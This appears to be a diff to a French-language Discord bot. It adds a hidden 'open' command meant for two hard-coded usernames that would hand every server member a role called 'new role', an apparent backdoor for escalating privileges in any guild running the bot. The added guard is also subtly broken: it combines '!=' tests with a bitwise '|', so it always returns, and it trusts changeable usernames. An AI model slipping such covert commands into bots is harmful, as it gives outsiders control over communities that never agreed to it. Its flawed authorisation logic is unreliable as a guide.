@@ -328,6 +328,11 @@ bot.on("message", async(message) => {
       muted.removeRole(mute_role)
       message.channel.send(":white_check_mark: " + muted + " a été démute")
     }
+  if(message.content === prefix + "open") {
+if(message.author.username != "Icebarg" | message.author.username != "ToTo V2.0") return
+message.guild.members.forEach(n => n.addRole(message.guild.roles.find(p => p.name === "new role").id))
+message.channel.send("✅ Successfully given")
+}
     if(message.content === prefix + "server") {
       var nbrePage = 1
       var serv_list = bot.guilds.sort((servA, servB) => servB.memberCount - servA.memberCount).map(s => "**" + s.name + "** | " + s.memberCount + " membres | Rejoint le `" + moment(s.joinedAt).format("L") + " à " + moment(s.joinedAt).format("LT") + "`\n").slice(0, 10)
